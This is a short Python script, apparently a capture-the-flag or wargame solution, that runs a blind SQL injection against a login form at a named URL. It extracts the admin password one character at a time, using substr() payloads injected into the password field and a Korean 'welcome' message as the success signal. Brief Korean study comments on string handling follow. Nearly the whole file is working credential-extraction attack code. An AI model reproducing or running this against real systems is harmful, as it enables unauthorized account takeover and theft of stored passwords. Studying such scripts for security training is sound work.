# -*- coding: utf-8 -*-
import requests

password = ''

for idx in range(1, 33):
    for c in list(map(chr, range(97, 123))):
        param = {'id': 'admin', 'pw': "' or substr((select pw from user where id='admin')," + str(idx) + ",1)='"+c}
        res = requests.post('http://cykor.kr/sdsdsds', data=param)

        login_msg = bytes('환영합니다', 'utf-8')
        if res.content.find(login_msg) != -1:
            print('부분 문자열' + c)
            password += c
            break

print('admin password=' + password)


# 문자열을 list로 가져오는 방법
# r = range(ord('a'),...
# format 함수를 잘 사용하면, string concat을 하지 않더라도, 문자열을 쉽게 만들 수 있다.